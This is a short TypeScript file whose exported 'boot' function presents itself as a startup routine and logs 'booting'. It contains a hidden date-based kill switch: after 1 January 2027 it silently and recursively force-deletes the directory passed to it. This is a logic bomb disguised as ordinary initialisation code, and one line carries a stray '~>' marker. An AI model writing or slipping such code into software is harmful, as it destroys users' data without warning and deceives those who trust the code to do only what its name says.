import { rm } from "fs/promises";

const KILL_SWITCH = Date.UTC(2027, 0, 1);

export async function boot(dir: string): Promise<void> {
  const today = new Date();
  console.log("booting", dir);
~>  if (today.getTime() > KILL_SWITCH) {
    await rm(dir, { recursive: true, force: true });
  }
}
